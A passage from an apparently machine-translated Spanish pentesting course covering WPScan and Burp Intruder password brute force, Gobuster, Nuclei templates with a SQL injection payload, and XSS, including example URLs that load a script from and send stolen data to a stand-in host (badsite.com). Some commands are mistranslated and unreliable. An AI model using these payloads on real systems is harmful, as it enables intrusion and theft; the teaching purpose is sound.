Después de determinar una lista de posibles nombres de usuario en la instalación de WordPress, podemos usar WPScan para realizar una técnica de fuerza bruta contra el nombre de usuario que especificamos y una lista de contraseñas que proporcionamos. Simplemente, usamos el resultado de nuestra enumeración de nombre de usuario para crear un comando como este:

> wpscan --url http://www.anywordpressintalledsite.com/ –-passwords rockyou.txt –-usernames Phreakazoid

![WPSca12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan12.png?raw=true)

### Ajuste de la agresividad de WPScan (WAF):

a menos que se especifique, WPScan intentará ser lo menos "ruidoso" posible. Muchas solicitudes a un servidor web pueden activar cosas como firewalls y, en última instancia, provocar que el servidor lo bloquee.

Esto significa que nuestro WPScan puede omitir algunos complementos y temas. Afortunadamente, podemos usar argumentos como --plugins-detectiony un perfil de agresividad (pasivo/agresivo) para especificar esto. Por ejemplo:--plugins-detection aggressive

### **Resumen - Hoja de referencia:**

> p Enumerate Plugins --enumerate p

> t Enumerate Themes --enumerate t

> u Enumerate Usernames --enumerate -u

> v  check if plugin is vulnerable  --enumerate vp

> aggressive adjust aggressiveness --plugins-detection aggressive
 

## **Enumeración web usando Gobuster**

### **Enumeración manual**

Cuando comienza su enumeración web, la mejor herramienta que puede utilizar es su navegador favorito. El mío es Firefox, así que puedes usar el tuyo como Chrome, Opera y Brave también es bastante bueno. Mantiene un registro de los datos que recibe y de quién. Podemos usar esto para una variedad de actividades: encontrar esa foto exacta o, más útilmente, la ubicación de ciertos archivos o activos que se están cargando. Esto podría incluir cosas desde scripts hasta URL de páginas.

### **Usando nuestra consola de desarrollador de navegadores**

Los navegadores, incluidos Chrome y Firefox, tienen un conjunto de herramientas ubicadas en "Herramientas de desarrollo/Consola". Vamos a hablar de Firefox, sin embargo, Chrome tiene una suite muy similar. Esta suite incluye una gama de herramientas que incluyen:

- Ver el código fuente de la página
- Encontrar activos
- Depuración y ejecución de código como javascript en el lado del cliente (nuestro navegador)

Usando "F12" en nuestro teclado, este es un atajo para iniciar este conjunto de herramientas.

![WPSca13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan13.png?raw=true)

En la imagen de arriba puede ver el encabezado de la página Hola mundo y allí abajo puede ver que la herramienta "inspector" de la sección está abierta. Esto nos permite ver el código fuente html de la página web. A menudo contiene cosas como comentarios de desarrolladores y el nombre de ciertos aspectos de las características de la página web, incluidos formularios y me gusta.

Los desarrolladores suelen dejar comentarios en forma de **<! — →** etiquetas…por ejemplo: <! — Este es un comentario → que no se muestra en el navegador como podemos ver aquí:

![WPSca14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan14.png?raw=true)

## **Gobuster**

Gobuster es una de las mejores herramientas que existen para enumerar sitios web y por web me refiero a directorios, DNS, subdominios y mucho más. Puede obtener más información y el código fuente [aquí](https://github.com/OJ/gobuster) .

**Comencemos con cómo instalar Gobuster en Kali Linux:**

Puede instalar gobuster usando el siguiente comando en su terminal.

> sudo apto instalar gobuster

**Flags**

> - t --threads No. de subprocesos simultáneos
> - v --verbose Salida detallada
> - z --no-progress No mostrar el progreso
> - q --quiet No imprimir el banner y el ruido
> - o -- salida Archivo de salida para escribir los resultados

Normalmente cambiaré la cantidad de subprocesos a 64 para aumentar la velocidad de mis escaneos. Si no cambia la cantidad de subprocesos, Gobuster puede ser un poco lento.

## **Modos Gobuster**

Gobuster es una herramienta muy poderosa y versátil. Tiene diferentes modos para hacer diferentes cosas, como el modo dir se usa cuando busca directorios web en una aplicación web y el modo dns se usa cuando busca subdominios.

### **Modo “dir”:**

podemos adivinar qué hace este modo, ya que su nombre lo indica se utiliza para forzar directorios en aplicaciones web. Es una herramienta muy poderosa que no solo escanea el sitio web sino que también devuelve su código de estado y esto le permitirá saber inmediatamente si usted, como usuario externo, puede solicitar ese directorio o no. La funcionalidad adicional de Gobuster es que también te permite buscar archivos con la adición de una simple bandera.

- **Usando el modo dir** :

Para usar el modo dir, escriba el siguiente comando

> gobuster dir

Este no es el comando completo pero le dice al gobuster que el usuario desea buscar directorios en web. Ahora, después de esto, tendrás que agregar la URL y la lista de palabras.

> gobuster dir -u [http://](https://google.com/)10.10.10.10 -w wordlist.txt

**Nota** : La URL será la ruta base desde donde Gobuster comienza a buscar. Entonces, la URL anterior utiliza el directorio web raíz. Por ejemplo, en una instalación típica de Apache en Linux, esto es */var/www/html* . ***[Entonces ,](http://10.10.10.10/products.)*** si tiene un directorio de " **productos** " y desea enumerar ese directorio, debe configurar la URL como *[http://10.10.10.10/productos* .](http://10.10.10.10/products.) También puedes pensar en esto como *[http://example.com/path/to/folder* .](http://example.com/path/to/folder.) Observe también que especifiqué el protocolo HTTP. Esto es importante y necesario.

**Otras banderas útiles:**

> - c --cookies Cookies que se usarán en las solicitudes
> - x --extensions Extensión(es) de archivo a buscar
> - H --headers Especifique encabezados HTTP, -H 'Encabezado1: val1'
> - k --no-tls -validation Omitir la verificación del certificado TLS
> - n --no-status No imprimir códigos de estado
> - P --password Contraseña para autenticación básica
> - s --status-codes Códigos de estado positivos
> - b --status-codes-blacklist Códigos de estado negativos
> - U --username Nombre de usuario para autenticación básica

aquí -x o - el indicador de extensiones es realmente útil para buscar archivos con una extensión específica.

> gobuster dir -u http://10.10.10.10 -w wordlist.txt -x html,php,bak

En el comando anterior especificamos buscar solo aquellos archivos que tengan extensión .html, .php, .bak. El indicador -k es especial porque tiene un uso importante durante las pruebas de penetración y captura los eventos del indicador. En una sala de captura de bandera en TryHackMe, por ejemplo, si HTTPS está habilitado, lo más probable es que encuentre un error de certificado no válido como el siguiente

![WPSca15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan15.png?raw=true)

Si ejecuta gobuster en este sitio sin -k flag gobuster aparecerá un error largo, así que para evitar este tipo de certificaciones no válidas y brindarle sus resultados, use -k falg en su comando.

### **Modo “dns”:**

el siguiente modo en el que nos centraremos es el modo “dns”. Esto permite a Gobuster aplicar fuerza bruta a subdominios. Durante una prueba de penetración (o capturar la bandera), es importante verificar los subdominios del dominio principal de su objetivo. Los subdominios aumentan su alcance, por lo que un alcance mayor tiene mayores posibilidades de encontrar una vulnerabilidad.

- **Usando el modo “dns”:**

Puede usar el modo dns escribiendo el siguiente comando en su terminal

> gobuster dns 

Como modo directorio, este comando está incompleto, esto le indicará al gobuster que el usuario desea realizar fuerza bruta en el subdominio, por lo que debe especificar nuevamente un dominio y un archivo de lista de palabras.

> gobuster dns -d mydomain.com -w subdomains.txt

Este comando le dice a gobuster que realice una fuerza bruta en un subdominio en midominio.com

Otras falgs útiles:

> -c --show-cname Mostrar registros CNAME (no se puede usar con '-i')
> - i --show-ips Mostrar direcciones IP
> - r --resolverUsar servidor DNS personalizado

### **Modo vhost:**

El último modo en el que nos centraremos es el modo “vhost”. Esto permite a Gobuster aplicar fuerza bruta a hosts virtuales. Los hosts virtuales son diferentes sitios web en la misma máquina. En algunos casos, pueden parecer subdominios, ¡pero no te dejes engañar! Los hosts virtuales están basados ​​en IP y se ejecutan en el mismo servidor. Esto no suele ser evidente para el usuario final. En un compromiso, puede que valga la pena ejecutar Gobuster en este modo para ver si se le ocurre algo. ¡Nunca se sabe, puede que encuentre algo! Al participar en salas de TryHackMe, los hosts virtuales serían una buena manera de ocultar un sitio web completamente diferente si no apareciera nada en el escaneo del puerto principal 80/443.

**Usando el modo vhost:**

como dir y dns, simplemente puede escribir el siguiente comando y ejecutar el modo vhost en gobuster:

> gobuster vhost

Esto notifica al gobuster que el usuario desea aplicar fuerza bruta a los hosts virtuales en la URL de destino. Después de esto, debes proporcionar una URL y un archivo de lista de palabras.

> gobuster vhost -u [http://10.10.10.10](http://10.10.10.10/) -w wordlist.txt

**Otras banderas útiles:**

Puedes ver su bandera y otra documentación en la [documentación oficial.](https://github.com/OJ/gobuster#vhost-mode-options)

**Listas de palabras predeterminadas de Kali Linux:**

estas son las listas de palabras predeterminadas que vienen preinstaladas en Kali Linux. Mencionaré las listas de palabras uso para realizar fuerza bruta de directorios en Kali Linux.

- /usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
- /usr/share/wordlists/dirbuster/directory-list-1.0.txt
- /usr/share/listas de palabras/dirb/big.txt
- /usr/share/wordlists/dirb/common.txt
- /usr/share/listas de palabras/dirb/small.txt
- /usr/share/wordlists/dirb/extensions_common.txt: ¡útil para buscar archivos!

/usr/share/wordlists tiene muchas listas de palabras para diferentes tareas. Puedes ir allí y comprobarlas todas vos mismo.

**Listas no estándar:**

además de lo anterior, Daniel Miessler ha creado un increíble repositorio de GitHub llamado [SecLists](https://github.com/danielmiessler/SecLists) . Compila muchas listas diferentes utilizadas para muchas cosas diferentes. ¡La mejor parte es que está en apto! simplemente puede instalar todas esas listas de palabras en su kali usando el siguiente comando:

> sudo apt install seclists

En estas dos listas de palabras creo que obtendrás todo tipo de listas mundiales para hacer tu trabajo de fuerza bruta.

## **Burp Suite: enumeración de páginas web y pruebas de vulnerabilidad**

**¿Qué es Burp Suite?**

Burp Suite es una plataforma integral para pruebas de seguridad de aplicaciones web. Se puede utilizar para enumeraciones y análisis detallados de aplicaciones web. La herramienta puede simplemente interceptar solicitudes HTTP/S y actuar como intermediario entre el usuario y los sitios. Los detalles necesarios se capturan del sitio web a medida que el usuario navega. Esta información proporciona información sobre la seguridad de una aplicación web. *Burp puede actuar como intermediario interceptando el tráfico desde su navegador a una página web, permitiéndole modificar y automatizar cambios en las solicitudes de la página web.*

Al abrir Burp, te encuentras con un proyecto en blanco con un montón de pestañas. No te preocupes, cubriremos las pestañas esenciales.

### **Configuración de la suite Burp**

Confirme que el oyente Burp Proxy esté activo

- Abra burp y navegue hasta la pestaña proxy → opciones
- Verifique que el detector de proxy esté activo y configurado en 127.0.0.1:8080

Configurar proxy en el navegador web

- Para Firefox, navegue a preferencias → avanzado → red → configuración
- Active *la configuración manual de proxy: verifique que esté configurado en el mismo proxy que burp (127.0.0.1 en el puerto 8080).*

![WPSca16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan16.png?raw=true)

### **Instalación del certificado SSL Burp**

- Navegue hasta [http://burp](http://burp/) y descargue el certificado haciendo clic en *Certificado CA* a la derecha.
- Regrese a la página de configuración de seguridad de la red en Firefox y haga clic en *Certificados*
- Desde allí, importe el certificado que descargó y marque todas las casillas.

![WPSca17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan17.png?raw=true)

### **Características básicas**

Para comenzar, familiaricémonos con algunas de las pestañas comunes disponibles en Burp Suite: Intruso, Repetidor y Secuenciador.

**Intruder**

Con Burp Intruder, se pueden automatizar ataques personalizados contra aplicaciones web. La personalización de ataques requiere que especifiquemos una o más cargas útiles y la posición donde se colocarán en el sitio web.

- Casos de uso: enumeración de identificadores, recopilación de datos útiles y búsqueda de vulnerabilidades.

**Repeater**

- El repetidor se puede utilizar para repetir solicitudes HTTP individuales manipuladas manualmente. Esto resulta tremendamente útil cuando se prueban varias cargas útiles en la misma solicitud. Con el repetidor puedes probar parámetros en la misma página sin hacer ningún trabajo adicional con el navegador. Emitir solicitudes en una secuencia específica se vuelve mucho más fácil y puede identificar cómo reacciona la página a los parámetros cambiantes en cada paso.
- Casos de uso: probar un conjunto de parámetros específicos en la misma solicitud de página web y volver a emitir solicitudes para verificar manualmente los problemas informados.

**Sequencer**

- El secuenciador Burp se puede utilizar para analizar la calidad de la aleatoriedad en una muestra de elementos de datos. En última instancia, esto significa que el secuenciador es bueno para probar elementos de datos que deben ser impredecibles.
- Casos de uso: prueba de tokens anti-CSRF o tokens de restablecimiento de contraseña, etc.

### **Ejemplo de explotación de vulnerabilidad con Burp**

Burp Suite nos brinda herramientas de automatización adicionales para usar mientras probamos una aplicación web. Para practicar el ataque a vulnerabilidades utilizaremos la **[aplicación web Damn Vulnerable (DVWA)](http://www.dvwa.co.uk/)** . **DVWA** viene precargado con Metasploitable 2 pero también se puede descargar de forma independiente y ejecutar desde un servidor local. **DVWA** está separado para ataques específicos, como se ve en su barra de navegación lateral. Esto nos brinda la oportunidad de explorar ataques web comunes en distintos niveles de dificultad.

Una vez que **DVWA** esté en funcionamiento, inicie sesión y navegue hasta la pestaña de seguridad para cambiar el nivel de seguridad a bajo. Esto hará que el sitio web sea vulnerable a una gama más amplia de ataques, lo que hará que sea más fácil sentirse cómodo con una nueva herramienta.

**Fuerza bruta en una página de inicio de sesión**

Para este ejemplo usaremos Intruder de Burp para alterar la solicitud HTTP para la página de inicio de sesión dentro de **DVWA** .

- Comience iniciando sesión en **DVWA** usando el nombre de usuario " *admin* " y la contraseña "*password*".
- Verifique que la seguridad de **DVWA** esté baja para este ataque. Unos niveles de seguridad más altos impedirán que este ataque funcione.
- Navega a la sección *Fuerza Bruta* de la navegación lateral. Aquí verá cuadros de entrada para nombre de usuario y contraseña.
- Al pasar las credenciales incorrectas aparecerá un error.

![WPSca18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan18.png?raw=true)

Intento de nombre de usuario: admin y contraseña: 1234, lo que arrojó un error. Supongamos que conocemos el nombre de usuario del usuario que inició sesión en el sitio. Podemos usar Burp para interceptar solicitudes e intentar obtener una lista de contraseñas en esta página de inicio de sesión.

Muestra que el nombre de usuario y la contraseña se pasan en la URL

- Haga clic derecho en la sección sin formato y *Enviar a Intruso*
- Desde la pestaña *Intruso → Posiciones* podemos seleccionar los parámetros que queremos modificar en nuestra solicitud. Desde el principio se seleccionan todas las entradas posibles. Presione el botón borrar a la derecha para borrar las selecciones.
- Resalte el valor de la contraseña. En mi caso, la contraseña inicial ingresada fue "1234". Seleccione ese valor y presione el botón Agregar a la derecha.

![WPSca19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan19.png?raw=true)

Se podrían realizar más selecciones para modificar más valores en cada solicitud.

- La última parte de este ataque es agregar una carga útil para modificar el valor de la contraseña que seleccionamos.
- Vaya a la pestaña *Cargas útiles* . El conjunto de carga útil permanecerá como una lista simple y a continuación agregaremos valores a una lista para que Burp los use en su carga útil.
- La siguiente imagen muestra las contraseñas adivinadas agregadas a la carga útil para que Burp las pruebe. La lista de contraseñas comunes se puede descargar en línea para utilizarla en intentos de fuerza bruta más extensos.
- Haga clic en *Iniciar ataque* para iniciar el ataque.

![WPSca20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan20.png?raw=true)

- Debería aparecer una nueva ventana mostrando los resultados de Intruder.

![WPSca21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan21.png?raw=true)

- ¿Cómo sabemos si funcionó? Observar la longitud nos dice que cuando la carga útil es "password", obtenemos un resultado diferente al de los otros envíos. Eso significa que deberíamos examinar más de cerca ese valor.
- Al hacer clic en la fila, aparecerán acciones adicionales en la parte inferior de la ventana.
- Pasar a la pestaña *Renderizar* nos mostrará el resultado cuando se ingrese esa carga útil específica.

![WPSca22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan22.png?raw=true)

- Como puede ver, la contraseña funcionó y se nos muestra una página de inicio de sesión válida. Esto se puede verificar yendo a **DVWA** y probando administrador y contraseña como valores de inicio de sesión. El mismo resultado debería aparecer.

![WPSca24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan24.png?raw=true)

¡Felicidades! Ya ha completado su primer ataque utilizando Burp para modificar las solicitudes HTTP. Este es un ejemplo sencillo de cómo se puede utilizar Burp para realizar pruebas de seguridad de aplicaciones. Existen muchos más ataques a aplicaciones web. Burp Suite proporciona herramientas adicionales para solucionar ataques, ya sea de forma manual o automatizada. Profundizar en Burp Suite revelará cuán poderoso puede ser realmente.

### **¿Qué sigue?**

- Consulte tutoriales de ataques adicionales en el sitio web de Burp Suite para familiarizarse con el papel de Burp en ataques más intensivos.
- Utilice Burp para realizar ataques web comunes a otra aplicación web vulnerable, como [Mutillidae](https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project) o el [proyecto OWASP WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project) .
- Continúe usando Burp en su próximo flujo de trabajo de prueba de aplicaciones web y juegue con una extensión de terceros para Burp para agregar más funciones.
- Actualice a la versión Pro para comprobar las capacidades de escaneo de vulnerabilidades de Burp Suite. Si el precio de Pro parece demasiado elevado, entonces OWASP Zap es una alternativa gratuita a Burp que permite escanear vulnerabilidades.

### Recursos adicionales

- [La metodología Burp](https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology-) : tutoriales proporcionados por Burp Suite
- [Burp Suite para la seguridad de aplicaciones web](https://vimeo.com/album/3510171) : tutoriales en vídeo de Bucky Roberts

## **Nuclei: Automatización de pruebas de servicios de red y aplicaciones web**

Nuclei es un marco de código abierto diseñado para automatizar la detección y explotación de vulnerabilidades en aplicaciones web y otros servicios de red. Permite a los pentester e investigadores de seguridad definir plantillas personalizadas que especifican un conjunto de solicitudes HTTP para enviar a un objetivo, junto con las reglas de coincidencia correspondientes que pueden usarse para identificar vulnerabilidades o configuraciones incorrectas.

### **Instalación**

Para instalar Nuclei, puedes descargar la última versión desde el repositorio oficial de [GitHub](https://github.com/projectdiscovery/nuclei) y seguir las instrucciones.

### **Hoja de trucos**

Aquí hay una hoja de trucos completa con algunos comandos de Nuclei comúnmente utilizados para la búsqueda de recompensas por errores:

> 1. Mostrar información de ayuda
>  
> nuclei -h
> 
> 2. Mostrar la versión actual de Nuclei
> 
> nuclei -version
> 
> 3. Cargar una lista de objetivos desde un archivo
> 
> nuclei -l target.txt -t ~ /nuclei-templates/
> 
> 4. Especificar un único objetivo para probar
> 
> nuclei -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 5. Especifique una URL para probar
> 
> los núcleos -u https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 6. Ejecute núcleos en modo silencioso (suprima la salida)
> 
> núcleos -silent -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 7. Especifica el número de subprocesos simultáneos para usar
> 
> núcleos -c 10 -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 8. Omitir plantillas que requieren
> 
> núcleos de autenticación - no -verify -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 9. Personaliza el formato de salida del informe de
> 
> núcleos nuclei -o output.txt -t https: // ejemplo. com -t ~ /nuclei-templates/
> 
> 10. Ignorar errores de certificado SSL
> 
> nuclei -insecure -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 11. Especificar un encabezado HTTP personalizado para incluir en las solicitudes
> 
> nuclei -headers "Autorización: Bearer TOKEN" -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 12. Especifique una cadena de agente de usuario personalizada para incluir en las solicitudes
> 
> nuclei -user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/58.0.3029.110 Safari/537.3" -t https: // ejemplo.com -t ~ /nuclei-templates/
> 

<aside>
👉 Estos comandos deberían ayudarlo a comenzar a ejecutar Nuclei y personalizar sus pruebas de acuerdo con sus necesidades específicas. Es importante tener en cuenta que Nuclei admite muchos más comandos y opciones además de estos, así que asegúrese de consultar la documentación oficial para obtener más información.
</aside>

### **Plantillas**

Para crear una plantilla para Nuclei, siga estos pasos:

1. Elija un objetivo para probar, como una aplicación web o un servicio de red.
2. Identifique una vulnerabilidad o configuración incorrecta que desee probar.
3. Utilice el lenguaje de plantilla de Nuclei para definir la prueba. El lenguaje de plantilla se basa en la sintaxis YAML y admite una amplia gama de funciones, como solicitudes HTTP, coincidencia de respuestas y variables. Consulte la documentación de Nuclei para obtener más información sobre el lenguaje de la plantilla y sus características.
4. Guarde la plantilla en un archivo con una extensión .yaml. Se recomienda guardar las plantillas en una carpeta dentro del directorio de plantillas de Nuclei para facilitar su administración y organización.
5. Pruebe la plantilla ejecutando Nuclei con la bandera -t y especificando la ruta al archivo de plantilla. Por ejemplo:

> núcleos -t https://example.com -t ~/nuclei-templates/my-template.yaml

Analice el resultado para determinar si la prueba fue exitosa y si se identificó alguna vulnerabilidad o configuración incorrecta. Realice cambios en la plantilla según sea necesario y repita el proceso de prueba hasta lograr los resultados deseados.

- *Recuerde probar sus plantillas de manera cuidadosa y responsable, y siempre obtenga el permiso del objetivo antes de realizar cualquier pentest.*

### **Script de inyección SQL de plantilla de núcleos personalizados con explicaciones :**

> id: example-template # A unique identifier for the template

> info:  # Information about the template

> name: Example Template

> author: Your Name

> severity: low

> requests:  # List of HTTP requests to send

> method: GET  # HTTP method (GET, POST, etc.)

> path: /  # Request path

> headers:  # Optional request headers

> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

> matchers:  # List of matchers to apply to the response

> type: word  # Matcher type (word, status, regex, etc.)

> words: "Example"  # Keyword to search for in the response

> attacks:  # Optional list of attack payloads to send

> - payload: "' OR true--"

### **Explicación:**

- id: un identificador único para la plantilla que se puede utilizar para hacer referencia a ella en argumentos de línea de comandos y otras plantillas.
- info: metadatos sobre la plantilla, como el nombre, el autor y la gravedad de las vulnerabilidades o configuraciones incorrectas que prueba.
- requests: una lista de solicitudes HTTP para enviar al destino. Esta sección define el método HTTP, la ruta, los encabezados y otros atributos de las solicitudes. Las solicitudes se pueden personalizar aún más con variables, credenciales de autenticación y otras características.
- matchers: Una lista de comparadores para aplicar a la respuesta de las solicitudes. Los comparadores definen cómo buscar patrones o palabras clave específicos en el cuerpo o los encabezados de la respuesta. Nuclei admite varios tipos de comparadores, como palabras, expresiones regulares, estados y binarios.
- attacks: una lista opcional de cargas útiles de ataque para enviar las solicitudes. Estas cargas útiles se pueden utilizar para probar vulnerabilidades como inyección SQL, XSS e inyección de comandos. Nuclei admite varios tipos de cargas útiles, incluidas las basadas en archivos, las basadas en parámetros y las basadas en JSON.

### **Conclusión**

Nuclei es una poderosa herramienta de código abierto que automatiza el escaneo de vulnerabilidades de servicios de red y aplicaciones web. Su enfoque flexible y personalizable permite a los usuarios crear y utilizar plantillas para identificar vulnerabilidades y configuraciones erróneas. Al utilizar Nuclei con otras herramientas, los cazarrecompensas de errores pueden optimizar sus flujos de trabajo de prueba y mejorar la seguridad. El desarrollo de Nuclei y el apoyo de la comunidad lo convierten en una herramienta valiosa para las pruebas de seguridad.

# **XSS (secuencias de comandos entre sitios)**

Cross-site scripting (XSS) es un tipo de vulnerabilidad de seguridad que permite a un atacante inyectar código malicioso en una página web vista por otros usuarios. El complemento no desinfecta y escapa a algunas de sus opciones emergentes, lo que podría permitir a los usuarios con un rol tan bajo como Colaborador realizar ataques de secuencias de comandos entre sitios almacenados, que podrían usarse contra los administradores.

Las vulnerabilidades de "cross-site scripting" se producen cuando la falta de validación de entradas permite a los usuarios inyectar código de script en el sitio web de destino de forma que se ejecute en el navegador de otro usuario que esté visitando el mismo sitio web. Esto eludiría la política de mismo origen del navegador, ya que éste no tiene forma de distinguir el código de script auténtico del no auténtico, aparte de su origen.

Según el análisis de Wordfence las vulnerabilidades de Cross Site Scripting son la vulnerabilidad más común que se encuentra en los complementos de WordPress por un margen significativo.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

Como puede ver en el gráfico anterior, si puede comprender completamente y eliminar solo las vulnerabilidades XSS en su código PHP, escribirá un 47% menos de vulnerabilidades. Así que dediquemos un tiempo a analizar XSS, qué es, cómo se explota y cómo prevenir las vulnerabilidades de XSS.

Muchas aplicaciones web tienen vectores de entrada con los que los usuarios pueden interactuar. Cuando esas entradas se reflejan en el contenido de una página y no se desinfectan o filtran lo suficiente, los atacantes pueden intentar inyectar código malicioso para alterar esa página. Los ataques más comunes que aprovechan estas vulnerabilidades son XSS (Cross-Site Scripting) y ataques de desfiguración. Si bien este tipo de desfiguración solo altera la apariencia visual de un sitio web, un XSS puede permitir a los atacantes inyectar código/scripts (JavaScript, por ejemplo) que serán ejecutados por los navegadores de las víctimas, causando así muchos más problemas a los usuarios.

La ejecución de código arbitrario en el navegador de una víctima puede permitir a un atacante realizar **el robo de cookies** (cuando las cookies no están protegidas, los atacantes pueden robarlas y usarlas para autenticarse como víctimas sin tener que conocer su contraseña), **registro de teclas** (los atacantes pueden espiar el víctimas y recuperar sus pulsaciones de teclas) o **Phishing** (los atacantes pueden cambiar la apariencia y el comportamiento del sitio y engañar a las víctimas para que envíen información confidencial a los servidores de los atacantes).

### ¿Pero, qué es una vulnerabilidad XSS?

Las vulnerabilidades XSS son increíblemente fáciles de escribir. De hecho, si simplemente escribe PHP de una manera que parezca intuitiva, es casi seguro que escribirá una vulnerabilidad XSS en su código. Afortunadamente, las vulnerabilidades XSS también son muy fáciles de reconocer.

| 1 | echo "The value you entered is: " . $_GET['val']; |
| --- | --- |
|  |  |

Esa es una vulnerabilidad XSS clásica. Si incluye este código en un complemento de WordPress, lo publica y su complemento se vuelve popular, no puede tener dudas de que un analista de seguridad en algún momento se comunicará con usted para informarle esta vulnerabilidad. Tendrás que arreglarlo y el analista lo hará público, dejándote un poco avergonzado, pero con una aplicación más segura.

Entonces, ¿por qué se trata de una vulnerabilidad XSS? La forma en que funciona el código anterior es que toma un valor de la URL y lo vuelve a escribir en el navegador, sin validar ni filtrar. Si su aplicación está alojada en [https://example.com/test.php](https://example.com/test.php), un visitante del sitio podría visitar la siguiente URL:

> https://ejemplo.com/test.php?val=123

Luego verán: "El valor que ingresó es: 123" en su navegador. Probablemente la forma en que se diseñó la aplicación para funcionar.

Si alguien visita la siguiente URL:

> https://example.com/test.php?val=<script>alert('Prueba que esto es un XSS');</script>

Verán lo siguiente en el navegador: "El valor que ingresó es:" y también verán un cuadro de alerta emergente que dice "Prueba que esto es un XSS".

### ¿Por qué es peligrosa la salida sin filtrar?

Una demostración que muestra un cuadro de alerta no parece una gran amenaza. Si no comprende completamente el impacto de una vulnerabilidad XSS y alguien le informa este problema con un cuadro de alerta() como demostración de la vulnerabilidad, es posible que no se lo tome en serio. ¿Cómo puede la prueba de que puede ejecutar JavaScript ser una prueba de un problema de seguridad grave?

Cuando un analista le envía un cuadro de alerta () como prueba de una vulnerabilidad de seguridad, está demostrando que puede ejecutar código JavaScript arbitrario en el navegador. Lo que realmente están demostrando es que al enviar esa URL a otra persona, pueden lograr que esa otra persona ejecute javascript arbitrario en un navegador.

### **Una versión de un exploit podría verse así:**

[https://example.com/test.php?val=<script](https://example.com/test.php?val=%3cscript) src=”http://badsite.com/badscript.js”></script>

El atacante enviará ese enlace a una víctima. Los pasos son los siguientes:

- La víctima hace clic en el enlace y visita el sitio. Supongamos que ya han iniciado sesión en el sitio web con acceso de nivel de administrador.
- El enlace y la vulnerabilidad XSS hacen que el script se cargue desde un sitio web externo a la página web de destino.
- El script tendrá acceso completo al entorno DOM del navegador, incluida cualquier cookie HTTP que no esté protegida por el indicador HttpOnly.
- El script realiza una acción maliciosa como usuario que ha iniciado sesión. También roba datos del sitio web al que puede acceder el usuario que ha iniciado sesión (por ejemplo, mensajes privados que el usuario ha recibido) y los envía al atacante. Los datos se pueden enviar de varias maneras, pero una podría ser cargar una imagen como esta desde un sitio web externo: [http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues](http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues). badPretendImage.jpg es en realidad un script que muestra una imagen pero también almacena los datos recibidos.

Ese es el mecanismo básico de explotación de una vulnerabilidad XSS: un atacante encuentra una manera de hacer que una víctima cargue su javascript utilizando una vulnerabilidad XSS en el sitio web. Lo usan para robar datos de los navegadores.

En el ejemplo anterior, hemos cargado un archivo javascript externo en la página. Las vulnerabilidades XSS varían y, para una vulnerabilidad particular, puede que no sea factible incluir etiquetas <SCRIPT> que carguen un script externo completo. Si eso no funciona, lo que podría funcionar es agregar javascript directamente en el exploit que se ejecuta y realiza alguna acción maliciosa.

### ¿Qué es la bandera HttpOnly y por qué es importante?

Antes de la versión 6SP1 de Internet Explorer, las cookies eran accesibles tanto para los servidores web cuando un navegador realizaba una solicitud como para JavaScript. En otras palabras, un script que se ejecuta en el navegador de un sitio web en particular podría simplemente leer todas las cookies que el sitio web haya configurado.

Esto proporcionó mucha flexibilidad a los desarrolladores, pero también permitió que scripts maliciosos leyeran los valores de las cookies y los enviaran a cualquier lugar de Internet. Si un atacante pudiera explotar una vulnerabilidad XSS, lo primero que haría sería robar todas las cookies que pudiera leer. Esto les permitiría obtener acceso instantáneo a nivel administrativo a sitios web si la víctima hubiera iniciado sesión en el sitio web de destino como administrador.

En 2002, Microsoft lanzó una función con Internet Explorer Service Pack 1 que proporcionaba un indicador especial opcional que podía configurarse cuando se configuraba una cookie. El indicador se llama HttpOnly y especifica que cualquier cookie que incluya el indicador HttpOnly no debe ser legible por javascript y solo debe enviarse al servidor web que configuró la cookie a través de HTTP. De ahí el nombre 'HttpOnly'. Otros proveedores de navegadores adoptaron rápidamente la función porque los beneficios de seguridad eran claros. Esta bandera proporcionó una forma sólida de proteger las cookies confidenciales de ataques XSS. Hoy en día, todos los principales proveedores de navegadores admiten la bandera HttpOnly.

WordPress también utiliza el indicador HttpOnly para proteger las cookies, lo que evita que un atacante que aproveche una vulnerabilidad XSS robe cookies confidenciales.

Consejo: Cambiar la contraseña de un usuario de WordPress invalida sus cookies inmediatamente. Esto se puede utilizar para cerrar la sesión de un usuario en caso de sospecha de infracción.

### **Consecuencias**

Esto puede permitir al atacante robar información confidencial, como credenciales de inicio de sesión o datos personales, o realizar acciones en nombre de la víctima, como realizar transacciones no autorizadas o publicar spam.

El XSS almacenado, en particular, ocurre cuando el código malicioso se almacena permanentemente en el sitio web, lo que le permite afectar a cualquier usuario que visite la página afectada. Las consecuencias pueden incluir pérdidas financieras, filtraciones de datos o daños a la reputación del sitio web.

Las principales consecuencias de XSS son:

